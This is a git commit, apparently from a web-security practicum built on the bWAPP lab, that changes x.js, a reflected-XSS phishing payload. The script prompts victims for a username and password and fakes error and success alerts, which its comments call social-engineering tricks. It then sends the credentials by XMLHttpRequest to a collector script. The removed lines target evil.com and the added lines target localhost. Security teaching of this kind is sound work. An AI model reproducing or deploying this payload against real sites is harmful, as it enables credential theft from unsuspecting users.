bd2175b7e9cc011f0e86de2b524a568ed83c2da8
Muhammad Anis Al Hilmi <alhilmi1@gmail.com>
2020-11-11 11:02:27 +0700

    Local Reflected XSS
    Link download palsu di PDF Bahan Praktikum 9

--- x.js
+++ x.js
@@ -4,11 +4,11 @@ var pass = prompt("Password:");			 				//read second input as password
 
 if (user == null || pass == "") {		 				//make sure that victim doesn't put blank input
     alert('error'); 					 				//make it as if a real error (soc-eng techniques)
-    window.location.href = "http://your-website.com/"	//redirect to main page of your-website.com
+    window.location.href = "http://localhost/user/bWAPP_latest/bWAPP/xss_get.php"	//redirect to main page of your-website.com
 } else {
     alert('OK');										//make it as if a real true
     var xhttp = new XMLHttpRequest();					//javascript send request
-    xhttp.open("GET", "http://evil.com/x.php?u=" + user + "&p=" + pass, true);  //javascript send request
+    xhttp.open("GET", "http://localhost/user/xss_attack/xss-master/x.php?u=" + user + "&p=" + pass, true);  //javascript send request
     xhttp.send();										//throw victim input to x.php
-    window.location.href = "http://your-website.com/"	//redirect to main page of your-website.com
+    window.location.href = "http://localhost/user/bWAPP_latest/bWAPP/xss_get.php"	//redirect to main page of your-website.com
 }
